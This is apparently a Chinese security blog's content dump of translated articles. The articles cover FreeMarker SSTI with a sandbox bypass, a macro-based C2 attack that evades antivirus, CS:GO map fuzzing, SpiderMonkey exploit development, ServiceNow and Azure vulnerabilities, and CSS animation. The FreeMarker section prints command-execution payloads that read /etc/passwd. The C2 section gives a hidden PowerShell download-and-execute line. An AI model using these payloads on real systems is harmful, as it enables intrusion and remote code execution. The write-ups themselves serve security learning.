FreeMarker模板引擎中的SSTI漏洞实现远程代码执行\r2023年，我在使用旧版FreeMarker模板引擎的应用中发现了一个重大漏洞。该版本存在服务器端模板注入(SSTI)漏洞，使我能够实现远程代码执行(RCE)。报告问题后，公司立即实施了沙箱机制来缓解SSTI攻击风险。但由于仍在使用FreeMarker 3.2.30以下版本，存在已知的沙箱绕过漏洞。本文将深入分析这一发现，重点展示绕过沙箱机制的具体步骤。\nFreeMarker模板引擎工作原理\rFreeMarker是一款广泛采用的模板引擎，主要用于Java应用中将表现逻辑与业务逻辑分离。它允许开发者创建包含静态内容和动态占位符的模板，这些模板可以通过Java对象或数据库查询等数据源填充，最终生成动态输出。\nHTML转PDF的工作流程如下：\nHTML结构定义：在FreeMarker模板文件中定义HTML结构，包括内容、格式和样式 FreeMarker指令：使用\u0026lt;#开头的指令动态填充数据，包括集合遍历、条件渲染和变量访问 指令块：在指令中定义可条件执行或循环的代码块 HTML渲染：将模板与数据合并生成最终HTML PDF转换：使用HTML转PDF工具将生成的HTML转为PDF文档 漏洞发现过程\r在应用测试阶段，我观察到\u0026lt;#if\u0026gt;、\u0026lt;#list\u0026gt;等标签的使用，确认应用使用了FreeMarker引擎。通过以下测试代码验证了引擎行为：\n1 2 \u0026lt;#assign test = .version\u0026gt; TEST FOR SSTI: ${3*3} 这些测试验证了引擎对特殊字符的处理、变量声明和基础运算能力。接着使用以下代码确认引擎版本：\n1 2 \u0026lt;#assign freemarkerVersion = .version\u0026gt; FreeMarker version: ${freemarkerVersion} 确认版本低于2.3.30，存在SSTI漏洞(CVE-2021-25770)。\n漏洞利用\rfreemarker.template.utility.Execute类允许在模板中执行外部命令。构造如下payload可读取/etc/passwd文件：\n1 ${\u0026#34;freemarker.template.utility.Execute\u0026#34;?new()(\u0026#34;cat /etc/passwd\u0026#34;)} 公司随后引入了沙箱环境作为防护措施。沙箱限制了模板引擎的操作能力，提供了安全执行环境。但旧版本仍存在绕过可能。\n沙箱绕过技术\r验证特殊字符处理和运算能力后，构建绕过payload：\n1 2 3 4 5 \u0026lt;#assign classloader=article.class.protectionDomain.classLoader\u0026gt; \u0026lt;#assign owc=classloader.loadClass(\u0026#34;freemarker.template.ObjectWrapper\u0026#34;)\u0026gt; \u0026lt;#assign dwf=owc.getField(\u0026#34;DEFAULT_WRAPPER\u0026#34;).get(null)\u0026gt; \u0026lt;#assign ec=classloader.loadClass(\u0026#34;freemarker.template.utility.Execute\u0026#34;)\u0026gt; ${dwf.newInstance(ec,null)(\u0026#34;cat /etc/passwd\u0026#34;)} 该payload通过反射获取类加载器，加载关键类并最终执行命令，成功绕过沙箱防护。\n","date":"2025-08-02T07:11:23+08:00","permalink":"http://localhost:1313/p/%E7%AA%81%E7%A0%B4%E5%A3%81%E5%9E%92freemarker%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%B8%AD%E7%9A%84ssti%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"突破壁垒：FreeMarker模板引擎中的SSTI漏洞实现远程代码执行"},{"content":"使用AFL模糊测试《反恐精英：全球攻势》地图文件\rRealWorldCTF 2018有一个非常有趣的挑战叫做\u0026quot;P90 Rush B\u0026quot;，这是对Valve游戏《反恐精英：全球攻势》中一种战术的影射。该挑战要求发现并利用CS:GO服务器使用的地图文件加载器中的漏洞。\n在CTF期间，我利用了一个栈缓冲区溢出漏洞，后来另一个团队在他们的报告中很好地描述了这个漏洞。由于这个漏洞也影响了官方的CS:GO Windows客户端，符合Valve的漏洞赏金计划条件，实际上它只是一个旧报告的小变种，所以我在CTF结束后很快报告了它，并迅速得到了修复。\nBSP文件格式与攻击面\rCS:GO（可能所有Source引擎游戏）使用的地图文件格式称为BSP，是二进制空间分割的缩写，这是一种方便的n维空间对象表示方法。然而，这种格式支持的远不止3D信息。BSP文件由服务器和客户端共同处理，因为两者都需要地图信息的某个子集来执行各自的任务。这是一个远程攻击面，因为客户端会在服务器发起的地图变更时从服务器下载未知地图。\n模糊测试设置\r为了简单起见，我决定模糊测试Linux服务器二进制文件，而不是实际的客户端（也可以在Linux上运行）。用这种方法显然无法发现客户端特有的问题，但我希望能找到共享代码中的低悬果实。\n我编写了一个简单的包装器来处理服务器二进制文件使用的共享库，最重要的几个是：\nengine.so - 主要Source引擎代码（包含BSP解析器） dedicated.so - 专用服务器实现（包含应用程序入口点） libtier0.so - 可能与Steam/应用程序管理相关 AFL修改\r我对AFL做了一些简单的修改：\n输入文件必须以.bsp结尾才能被GetModelForName正确解析 需要能够指定自定义的fork服务器启动点 增加等待fork时的超时乘数 漏洞分类与根因分析\r我们需要将\u0026quot;好\u0026quot;的漏洞与不感兴趣的漏洞（如纯越界读取）分开。我基于调用栈进行了简单的去重，然后在Valgrind中运行每个独特样本。\n经验总结\r从这个小型项目中我学到了：\nAFL在QEMU模式下非常灵活，可以攻击特定代码段 输入文件大小非常重要，从300KB降到16KB后性能至少提高了5倍 分类对于筛选以前未经过模糊测试的代码库非常重要 堆上的内存损坏不是一个安全问题 :) 示例漏洞：CVirtualTerrain::LevelInit中的堆缓冲区溢出\r在CVirtualTerrain::LevelInit中发生堆缓冲区溢出，因为dphysdisp_t::numDisplacements变量可能大于g_DispCollTreeCount，而检查这种情况的断言在发布版本中不存在。攻击者可以很大程度上控制堆内容，因此很可能被利用，特别是在Windows 7上许多模块没有启用ASLR的情况下。\n[附上一个BSP文件，其中numDisplacements = 0xffff且g_DispCollTreeCount = 2，可以可靠地使csgo.exe崩溃]\n","date":"2025-08-02T06:54:57+08:00","permalink":"http://localhost:1313/p/%E4%BD%BF%E7%94%A8afl%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%8F%8D%E6%81%90%E7%B2%BE%E8%8B%B1%E5%85%A8%E7%90%83%E6%94%BB%E5%8A%BF%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/","title":"使用AFL模糊测试《反恐精英：全球攻势》地图文件的技术实践"},{"content":"点击启用内容 - 绕过杀毒检测的C2通信技术\r注意：本文所述技术可能已过时，但仍可作为学习现代工具技术演进的参考案例。\n在BHIS，绕过杀毒扫描已成为我们的\u0026quot;办公室运动\u0026quot;。在进行C2测试时，我们会从内网主机建立到C2服务器的反向连接，通过多种数据传递方式来测试防御系统的检测能力。我们的成功率很高（通常能成功外传数据），主要原因是恶意流量的识别极其困难——攻击者可以通过混淆技术使流量逃过杀毒软件和安全设备的检测。\n技术实现细节\r监听器配置\n在C2服务器设置443端口的反向TCP监听（选择443因其通常允许出站）。\n载荷生成\n使用Veil-Evasion工具生成混淆的PowerShell脚本载荷，该工具只需输入目标地址/端口及载荷类型即可自动生成代码。\n宏安全处理\n原始生成的2300字符单行脚本会触发VB编辑器报错。通过macro_safe.py脚本将长代码分割为VB可处理的片段：\n1 2 3 4 5 # macro_safe.py处理示例 # 将长命令拆分为多行连接字符串 str = \u0026#34;powershell -nop -w hidden -c \u0026#34; \u0026amp; _ \u0026#34;IEX ((new-object net.webclient).\u0026#34; \u0026amp; _ \u0026#34;downloadstring(\u0026#39;http://192.168.1.1/a\u0026#39;))\u0026#34; PPT宏植入\n将文档另存为.pps（97-2003格式）避免\u0026quot;m\u0026quot;扩展名引起怀疑 通过\u0026quot;开发工具\u0026quot;选项卡插入VB模块 使用\u0026quot;鼠标点击\u0026quot;动作触发宏执行（覆盖整个首幻灯片的文本框） 安全绕过实证\r测试扫描结果：\nGmail扫描器 ❌ 未检测 Windows Defender ❌ 未检测 McAfee ❌ 未检测 Symantec ❌ 未检测 唯一防护是PowerPoint的主动内容警告，但用户往往因\u0026quot;错误消息疲劳\u0026quot;而忽略。这种技术揭示了单纯依赖杀毒软件的黑名单机制和用户教育的重要性。\n\u0026ldquo;如果必须让用户做安全决策，就必须持续教育他们认识潜在危险。\u0026rdquo; —— BHIS团队\n","date":"2025-08-02T06:38:38+08:00","permalink":"http://localhost:1313/p/%E5%88%A9%E7%94%A8veil-evasion%E7%BB%95%E8%BF%87%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B%E7%9A%84c2%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/","title":"利用Veil-Evasion绕过杀毒软件检测的C2通信技术"},{"content":"粉碎动画系列第一部：经典卡通如何启发现代CSS\r浏览器厂商很快就在CSS中加入了运动功能。首先是简单的:hover伪类，随后是两种状态间的过渡动画。接着出现了通过@keyframes改变状态的能力，最近更是新增了与滚动位置联动的滚动驱动动画。\n即便有了这些增强功能，CSS动画仍然相对基础。这让我想起了小时候在电视上看到的汉纳-巴伯拉动画系列。\n低成本动画技术的启示\r这些动画短片缺乏真人电影或动画大片的预算，也远低于威廉·汉纳和约瑟夫·巴伯拉在米高梅制作《猫和老鼠》时的资源。这意味着动画师需要开发技术来克服成本限制和当时的技术局限。\n他们采用每秒更少的帧数和更少的画格。不是为每一帧使用不同的图像，而是将每幅画面重复多次。通过缩放和叠加额外元素来构建新场景，尽可能重复使用画格。他们保持角色身体基本静止，通过叠加眼睛、嘴巴和腿部来制造说话和走路的假象。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @keyframes background-scroll { 0% { background-position: 2750px 0; } 100% { background-position: 0 0; } } div { overflow: hidden; width: 100vw; height: 540px; background-image: url(\u0026#34;...\u0026#34;); background-size: 2750px 540px; background-repeat: repeat-x; animation: background-scroll 5s linear infinite; } 现代CSS实现技巧\r汉纳-巴伯拉动画师开发的简单高效技术可以用CSS实现。现代布局工具允许网页开发者分层元素。可缩放矢量图形(SVG)可以包含多个帧，开发者不必依赖JavaScript，可以使用CSS改变元素的不透明度、位置和可见性。\n在为艾美奖得主游戏作曲家Mike Worth设计网站时，我运用了这些原则。他想要一个大胆的复古风格设计来展示他的作品。我在整个网站中使用CSS动画，为访客创造惊喜。\n1 2 3 4 5 6 7 8 9 10 11 12 13 @keyframes bumpy-ride { 0% { translate: 0 0; } 10% { translate: 0 -5px; } 20% { translate: 0 3px; } 30% { translate: 0 -3px; } 40% { translate: 0 5px; } 50% { translate: 0 -10px; } 60% { translate: 0 4px; } 70% { translate: 0 -2px; } 80% { translate: 0 7px; } 90% { translate: 0 -4px; } 100% { translate: 0 0; } } SVG动画技巧\rSVG提供了惊人的性能和灵活性。通过CSS操作组和其他元素的能力，使其成为动画的理想选择。\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;svg\u0026gt; \u0026lt;!-- 静态元素 --\u0026gt; \u0026lt;g\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;!-- 动画帧 --\u0026gt; \u0026lt;g class=\u0026#34;frame-1\u0026#34;\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;g class=\u0026#34;frame-2\u0026#34;\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;g class=\u0026#34;frame-3\u0026#34;\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;g class=\u0026#34;frame-4\u0026#34;\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;g class=\u0026#34;frame-5\u0026#34;\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;g class=\u0026#34;frame-6\u0026#34;\u0026gt;...\u0026lt;/g\u0026gt; \u0026lt;/svg\u0026gt; 1 2 3 4 5 6 7 8 9 10 @keyframes ranger-talking { 0% { visibility: visible; } 16.67% { visibility: hidden; } 100% { visibility: hidden; } } [class*=\u0026#34;frame\u0026#34;] { visibility: hidden; animation: ranger-talking var(--animation-duration) infinite; } 动画的实用价值\r动画不仅仅是装饰，它们可以：\n通过引导用户操作改善可用性 在交互时带来愉悦和惊喜 强化品牌形象 帮助讲述品牌故事 在为Mike Worth设计的404页面中，当用户迷路时，他的吉祥物会慢慢陷入流沙，同时气泡上升，创造出一个既有趣又能反映品牌个性的体验。\n1 2 3 4 5 6 7 8 9 10 11 12 @keyframes four-oh-dear-bubbles { 0% { animation-timing-function: ease-in; opacity: 1; transform: translateY(45px); } 100% { animation-timing-function: ease-out; opacity: 1; translate: 0 0; } } 无障碍考虑\r不是所有人都以相同方式体验动画。有些人可能会感到不适甚至诱发癫痫。我们可以通过prefers-reduced-motion媒体查询来关闭动画：\n1 2 3 @media (prefers-reduced-motion: reduce) { * { animation: none !important; } } 就像汉纳-巴伯拉的动画师将技术限制转化为他们的标志性风格一样，CSS动画让网页专业人士能够打造富有特色的体验。通过分层元素、循环帧和应用细微运动，你可以在设计中注入个性，同时提升用户体验。\n","date":"2025-08-02T06:22:18+08:00","permalink":"http://localhost:1313/p/%E7%BB%8F%E5%85%B8%E5%8D%A1%E9%80%9A%E5%A6%82%E4%BD%95%E5%90%AF%E5%8F%91%E7%8E%B0%E4%BB%A3css%E5%8A%A8%E7%94%BB%E6%8A%80%E6%9C%AF/","title":"经典卡通如何启发现代CSS动画技术"},{"content":"移动出行服务中的实时欺诈检测：Kafka与Flink技术实践\r移动出行服务（如Uber、Grab、FREE NOW和DoorDash）建立在实时数据基础之上。每次行程、配送和支付都依赖精准的即时决策。但随着业务规模扩大，这些服务成为复杂欺诈的主要目标——GPS欺骗、虚假账户、支付滥用等。传统的批量欺诈检测方式因响应延迟、模式识别不足会产生安全盲区。领先平台正在采用Apache Kafka和Apache Flink构建实时事件处理系统，在欺诈发生瞬间进行拦截。\n移动出行服务的商业挑战\r现代城市生活中，网约车、外卖配送、共享单车等移动服务已成为基础设施。这些平台连接数百万用户、司机和商户，但同时也面临以下典型欺诈：\n虚假行程与GPS欺骗：司机伪造GPS数据模拟未发生的行程 支付欺诈与盗刷信用卡：使用盗取的支付方式叫车/订餐 虚假司机/乘客账户：同一人操控多账户套取平台补贴 促销滥用：通过海量虚假账号薅取推荐奖励 账户劫持：黑客盗用合法账户的支付信息 传统反欺诈系统的局限性\r基于批处理和规则引擎的传统方案存在四大缺陷：\n无法实现交易前的实时拦截 难以处理每秒百万级的事件吞吐 静态规则难以应对快速演变的欺诈模式 难以跨混合云环境部署 Kafka+Flink实时反欺诈架构\rApache Kafka：事件流处理核心\r实时采集GPS定位、支付交易、用户行为等数据 支持每秒百万事件处理能力 提供跨云环境的24/7高可用服务 Apache Flink：实时流分析引擎\r异常检测：识别GPS轨迹突变等空间异常 多流关联：实时聚合支付事件、位置更新等数据 在线机器学习：动态更新欺诈识别模型 毫秒级评分：在交易完成前生成风险评分 行业实践案例\rFREE NOW（Lyft）实时行程欺诈检测\r使用Kafka Streams分析150+欧洲城市的GPS数据 通过路线异常识别虚假行程 在Confluent Cloud上实现全托管流处理 GrabDefence反欺诈系统\r基于Kafka+Flink的实时风险评分 设备指纹+支付行为多维分析 将欺诈率从1.6%降至0.2% Uber RADAR项目\rKafka+Spark混合处理架构 机器学习识别拒付欺诈 引入人工审核闭环机制 技术实施关键点\r事件时间处理：正确处理乱序到达的移动端事件 状态管理：维护用户行为基线用于异常比对 模型部署：TensorFlow/PyTorch模型嵌入Flink流水线 动态规则更新：通过Kafka主题实时推送新规则 实时反欺诈已成为移动出行平台的核心竞争力。通过Kafka和Flink构建的流式处理架构，企业能够在损失发生前拦截99%的欺诈行为，同时将运营成本降低40%以上。\n","date":"2025-08-02T06:05:44+08:00","permalink":"http://localhost:1313/p/%E5%9F%BA%E4%BA%8Ekafka%E5%92%8Cflink%E7%9A%84%E7%A7%BB%E5%8A%A8%E5%87%BA%E8%A1%8C%E6%9C%8D%E5%8A%A1%E5%AE%9E%E6%97%B6%E6%AC%BA%E8%AF%88%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"基于Kafka和Flink的移动出行服务实时欺诈检测技术解析"},{"content":"Warning to ServiceNow admins: Fix your access control lists now\r安全厂商警告称，ServiceNow管理用户访问控制列表(ACL)的方式存在漏洞，攻击者可轻松窃取敏感数据。研究人员敦促管理员立即检查自定义和标准数据配置表以加强安全防护。\nVaronis研究人员一年前就向ServiceNow报告了这个漏洞，使其能够悄悄修补平台并在5月向客户发布安全更新。随着ServiceNow本周发布通用漏洞披露(CVE-2025-3648)，Varonis公开了漏洞细节。\nIDC总裁Crawford Del Prete表示：\u0026ldquo;ServiceNow的更新修复了可能允许低权限用户访问受限数据的漏洞。考虑到ServiceNow处理的数据类型，这种情况总是可能很严重。\u0026rdquo;\nForrester Research企业架构首席分析师Charles Betz称这是\u0026quot;相当严重的漏洞\u0026quot;，敦促管理员\u0026quot;立即采取行动\u0026quot;。他指出：\u0026ldquo;随着CVE公开，攻击者很可能开始针对这些数据。\u0026rdquo;\n漏洞技术细节\r该访问控制漏洞允许未经认证或已认证用户在某些条件下通过查询请求访问未授权数据。Varonis安全研究经理Yogev Madar指出，攻击者可以利用以下方式实施攻击：\n仅依赖数据或脚本条件的ACL可能被滥用 未使用新的\u0026quot;Deny else\u0026quot;ACL机制 未应用Query ACL规则限制查询操作符 ServiceNow已在Xanadu和Yokohama平台版本中引入额外的访问控制列表框架。Varonis在博客中表示：\u0026ldquo;该漏洞相对容易利用，只需要最小的表访问权限，如实例中的弱用户账户甚至自注册匿名用户。\u0026rdquo;\n数据存储架构风险\rServiceNow将所有信息组织到表中，包括事件、请求、实例属性、用户数据、应用凭证等。这些表通过引用字段相互关联，而访问主要通过ACL规则控制。一个ServiceNow实例可能包含数万个ACL规则。\nACL规则包含四个访问条件，按以下顺序评估：\n必需角色 安全属性条件 数据条件 脚本条件 Varonis发现，如果访问因前两个条件被拒绝，系统会完全拒绝访问；但如果因数据或脚本条件被拒，用户仍能看到查询返回的记录总数，攻击者可利用查询参数通过枚举推断详细数据。\n修复建议\rServiceNow提供了新的ACL规则供管理员实施：\nQuery ACL：限制用户可执行的查询 新的安全数据过滤器：基于角色或安全属性限制记录访问 Reco首席产品官Gal Nakash强调：\u0026ldquo;这提醒我们即使成熟平台在访问控制方面也可能存在危险盲点。组织必须采用\u0026rsquo;最小权限\u0026rsquo;原则配置ACL，绝不能让角色和安全属性留空或过于宽泛。\u0026rdquo;\n","date":"2025-08-02T05:44:03+08:00","permalink":"http://localhost:1313/p/servicenow%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E6%84%8F%E7%AB%8B%E5%8D%B3%E4%BF%AE%E5%A4%8D%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%E6%BC%8F%E6%B4%9E/","title":"ServiceNow管理员注意：立即修复访问控制列表漏洞"},{"content":"今天我们将以\u0026quot;Max Power\u0026quot;方式配置云基础设施：将自动化与未经检查的AI输出相结合。不幸的是，这种方法产生的云基础设施代码虽然能用，但具有可怕的安全特性。\n简而言之，像Claude和ChatGPT这样的AI工具会轻易提供极其糟糕的云基础设施配置代码，比如使用常见硬编码密码的代码。这些工具还会\u0026quot;热心\u0026quot;地建议你使用\u0026quot;随机\u0026quot;密码，但由于LLM生成输出的本质，这些密码根本谈不上随机。即使你试图聪明地要求这些工具提供密码生成代码，这些代码也充满严重的安全漏洞。\n显然，不要盲目信任AI工具的输出。云服务提供商应该努力识别本文中提到的不良模式（和硬编码凭证），并在基础设施层进行拦截（就像他们在GitHub提交API密钥时做的那样）。LLM供应商应该考虑让生成存在明显安全问题的云基础设施代码变得不那么容易。\n创建一个Windows VM\r假设你是云开发新手。你想在Microsoft Azure上用Terraform创建一个Windows VM，并通过RDP连接到机器。（我们使用Azure作为示例只是因为这是我需要使用的提供商，但基本问题适用于所有云提供商）。\n让我们问问ChatGPT 4o和Claude应该怎么做。\n以下是ChatGPT的回答： [示例对话内容\u0026hellip;]\nClaude至少提醒你更改admin_password。这些都是硬编码凭证，使用它们很糟糕。是的，Claude要求你更改它们，但有多少人真的会这么做？应该相当容易设计正确的提示并提取出ChatGPT或Claude会输出的所有（技术上，几乎所有）凭证。\n要求更好的凭证\r我们都知道硬编码凭证不好。如果我们要求一些更好的呢？\n我们从ChatGPT开始： [示例对话内容显示生成的\u0026quot;随机\u0026quot;密码实际上并不随机\u0026hellip;]\n接下来试试Claude。起初它给出了正确的答案。但当被稍微不同地询问时，Claude很快就放弃了。\n关于密码生成\r也许我们可以要求这些工具编写生成密码的代码。事实上，我需要完成的部分任务涉及创建多个Azure AD账户，这似乎是个合乎逻辑的方法。看看我们的AI工具在自动生成账户凭证方面表现如何。\n以下是ChatGPT的解决方案： [展示有安全缺陷的Python随机模块代码\u0026hellip;]\nClaude的解决方案： [同样展示不安全的伪随机生成代码\u0026hellip;]\n这两个解决方案都非常具有欺骗性，因为它们看起来正确但实际上错得离谱。它们会生成\u0026quot;看起来\u0026quot;随机的密码，但存在缺陷：Python的random模块不是安全的随机数据源。它是一个用当前系统时间作为种子的伪随机生成器。很容易就能生成这个脚本在过去一年或更长时间内可能生成的所有密码。它提供的密码不应该用于任何用途，也许除了临时测试。正确的做法是使用Python的secrets模块。\n可以采取的措施\r毫无疑问，这个兔子洞很深。这里的回应只是我在几天内尝试自动化Terraform工作流程时遇到的。可悲的是，最不可能理解硬编码凭证和弱随机值影响的人，也最有可能直接复制粘贴AI工具的原始输出。\n云提供商应该假设人们已经在复制粘贴ChatGPT和Claude的输出，并应该努力拦截常见的硬编码凭证和其他不良基础设施模式。\nLLM供应商应该让用户更难意外地伤害自己。不应该是完全不可能出现这种行为，但绝对不应该是默认行为。\n一如既往，云基础设施很复杂；如果你真的想增强安全性，考虑让我们进行基础设施威胁模型评估，这将识别弱点和潜在攻击路径，并提出解决方法。在你庞大的自动化基础设施部署中，潜伏着比硬编码凭证和弱随机性更多的问题。\n","date":"2025-08-02T05:27:39+08:00","permalink":"http://localhost:1313/p/%E9%94%99%E8%AF%AF%E4%BD%86%E5%BF%AB%E9%80%9F%E7%9A%84%E4%BA%91%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE%E6%96%B9%E5%BC%8F-%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E8%AD%A6%E7%A4%BA/","title":"错误但快速的云基础设施配置方式 - 安全风险警示"},{"content":"Homebrew构建溯源初探\r去年11月，我们宣布与Alpha-Omega、OpenSSF合作，为Homebrew添加构建溯源功能。现在，我们很高兴地宣布核心功能已进入公测阶段：homebrew-core现对所有官方CI构建的bottle（预编译二进制包）提供密码学证明。用户可通过我们开发的brew verify命令（当前为第三方插件，即将合并到上游）进行验证：\n1 2 brew tap trailofbits/homebrew-brew-verify brew verify \u0026lt;package\u0026gt; 技术实现原理\r构建身份绑定\n每个bottle现在附带可验证的声明，将其内容与构建工作流元数据（包括Git提交哈希、GitHub Actions运行ID等）进行密码学绑定，形成符合SLSA Build L2标准的证明。\n防御供应链攻击\n该机制可防止两种威胁场景：\n攻击者直接上传恶意构建到bottle存储库 维护者同时替换bottle及其校验值的\u0026quot;沉默攻击\u0026quot; 历史包回填方案\n针对旧版本bottle的兼容性问题，我们创新性地采用双验证策略：\n优先检查主仓库（Homebrew/homebrew-core）的正式构建证明 若不存在，则检查由trailofbits/homebrew-brew-verify提供的回填签名 设置截止日期防止签名滥用 验证工具使用\r当前提供两种实验性验证方式：\n1 2 3 4 5 6 7 8 # 方式1：独立验证命令 brew update brew tap trailofbits/homebrew-brew-verify brew verify bash # 方式2：安装时自动验证 export HOMEBREW_VERIFY_ATTESTATIONS=1 brew install cowsay 技术架构细节\r底层依赖\n基于GitHub的构件证明新特性（artifact attestations），包括：\ngenerate-build-provenance Action gh attestation CLI工具 元数据结构\n采用in-toto声明格式封装以下元数据：\nGitHub仓库及所有者信息 触发工作流的分支/事件 构建时的精确git commit 未来规划\n将验证工具上游化到brew核心 开发纯Ruby验证器替代gh CLI依赖 扩展支持第三方tap仓库的构建证明 安全边界说明\r构建证明虽不能防御以下场景：\n软件本身的恶意代码 应用层的降级攻击 但能显著提升供应链透明度： 强制攻击行为公开化 减少攻击者可利用的隐蔽转换环节 有效应对类似xz-utils后门的分发篡改攻击 ","date":"2025-08-02T05:11:16+08:00","permalink":"http://localhost:1313/p/homebrew%E6%9E%84%E5%BB%BA%E6%BA%AF%E6%BA%90%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90%E6%8F%90%E5%8D%87%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8/","title":"Homebrew构建溯源技术解析：提升软件供应链安全"},{"content":"Webcast: Burp Suite入门与Web应用渗透测试\r你是否负责Web应用的安全工作？是否好奇渗透测试人员如何发现其中的漏洞？\nBurp Suite是众多Web应用渗透测试者和漏洞赏金猎人的首选工具。虽然入门简单，但其部分高级功能却难以快速掌握。如果你曾观摩他人使用Burp，定能从中获益——每位专家都有独到的使用技巧。\n在这段Black Hills信息安全团队(BHIS)的直播教学中，BB King将演示：\n环境配置：针对Web应用和API测试的Burp初始化设置（0:32:33） 核心功能：全工具链快速导览（0:45:25） 效率提升：推荐配置、BApp商店扩展及实战技巧（1:22:08） 无论你是安全工程师、开发人员还是IT管理者，本教程都能帮助你更高效地使用Burp Suite进行安全评估。\n资源索引\r演示大纲下载 Awesome Burp扩展合集 FoxyProxy火狐插件 PortSwigger官网 特别提示：本课程包含Innocent Lives基金会公益宣传环节，支持儿童网络安全保护事业。\n","date":"2025-08-02T04:49:48+08:00","permalink":"http://localhost:1313/p/burp-suite%E5%85%A5%E9%97%A8%E4%B8%8Eweb%E5%BA%94%E7%94%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/","title":"Burp Suite入门与Web应用渗透测试实战指南"},{"content":"引言\r本文记录了从未接触过浏览器漏洞利用的开发人员针对SpiderMonkey JavaScript Shell解释器和Mozilla Firefox（在Windows 10 RS5 64位系统上）开发三个漏洞利用的过程。近年来，浏览器利用引起了广泛关注，几乎每个主要CTF比赛都包含浏览器挑战，每月都有相关技术文章发布。\n我选择了Firefox的SpiderMonkey JavaScript引擎及其zn13编写的Blazefox挑战作为研究对象。本文展示了在这次探索中的发现和编写的三个漏洞利用：\nbasic.js：针对特定JavaScript解释器构建的漏洞利用，包含大量硬编码偏移 kaizen.js：改进版本，动态解析各种信息并使用基线JIT生成ROP gadget ifrit.js：最终针对Firefox浏览器的漏洞利用，利用JIT编译整个原生代码payload 环境设置\r首先需要设置调试环境，建议在虚拟机中进行。获取Mozilla的代码仓库（使用Git镜像）：\n1 git clone --depth 1 https://github.com/mozilla/gecko-dev.git 应用漏洞补丁文件blaze.patch后，安装Mozilla-Build工具链并配置x64调试构建：\n1 2 3 4 5 autoconf-2.13 mkdir build.asserts cd build.asserts ../configure --host=x86_64-pc-mingw32 --target=x86_64-pc-mingw32 --enable-debug mozmake -j2 SpiderMonkey内部机制\rJS::Values和JSObjects\rSpiderMonkey使用JS::Value作为JavaScript值的内部表示，其中高17位（JSVAL_TAG）用于编码类型信息，低47位（payload_）存储实际值或对象指针。\nJavaScript对象在内存中的布局：\n原生对象（NativeObject）包含shapeOrExpando_指针（描述对象属性）和存储元素/属性值的空间 数组对象（ArrayObject）继承自NativeObject，使用ObjectElements存储长度等信息 形状（Shapes）\r形状对象描述对象的属性，可以看作是一个哈希表，其中键是属性名，值是该属性值存储的槽位号。形状对象通过parent字段链接在一起形成属性链。\n漏洞利用开发\r漏洞分析\r漏洞源于添加的array_blaze方法，该方法将数组内部大小字段修改为420，从而允许越界访问：\n1 2 3 4 blz = [] blz.length // 0 blz.blaze() == undefined // false blz.length // 420 basic.js漏洞利用\r构建内存访问原语：通过相邻数组和TypedArray，将有限的内存读写转换为任意内存访问 对象地址泄露原语：通过操作相邻对象的属性存储槽位泄露对象地址 控制流劫持：覆盖js::Class的cOps函数指针 栈转移：使用ntdll中的gadget实现栈转移 ntdll基址泄露：通过kernel32导入表获取ntdll地址 执行原生代码：通过ROP链调用VirtualProtect使shellcode可执行 kaizen.js改进\r提高内存原语可靠性：使用Tenured堆中的ArrayBuffer替代Nursery堆中的对象 动态解析函数地址：通过PE结构解析导出函数地址 JIT gadget生成：强制JIT编译特定函数生成所需ROP gadget ifrit.js高级利用\r编译Firefox：构建64位Firefox用于漏洞研究 配置开发环境：禁用沙箱和多进程模式便于调试 JIT完整payload：通过精心构造的JavaScript函数，使JIT编译器生成完整的原生payload 结论\r本文详细介绍了从基础的漏洞利用到高级的JIT代码重用技术的演进过程。通过三种逐步改进的漏洞利用方法，展示了如何克服现代浏览器安全机制的挑战。虽然这些技术针对特定版本的SpiderMonkey，但其中涉及的概念和方法对理解现代浏览器漏洞利用具有普遍意义。\n完整代码和材料可在blazefox GitHub仓库获取，包括调试扩展、漏洞利用代码、构建的二进制文件和脚本等。\n","date":"2025-08-02T04:33:34+08:00","image":"https://i.imgs.ovh/2025/08/02/HiwQc.png","permalink":"http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2spidermonkey%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E9%AB%98%E7%BA%A7%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/","title":"深入探索SpiderMonkey漏洞利用：从基础到高级浏览器攻击技术"},{"content":"摘要\r谷歌根据协调漏洞披露(CVD)向微软报告了可能影响使用Azure Storage SDK(Python/.NET/Java版)客户端加密功能的填充Oracle漏洞(CVE-2022-30187)。微软已于2022年7月12日发布客户端加密功能v2正式版(GA)进行修复。目前未发现该漏洞在Azure服务中被利用的案例。\n客户影响\r使用受影响版本客户端加密功能的应用需升级至v2版本以确保安全。客户可通过Azure 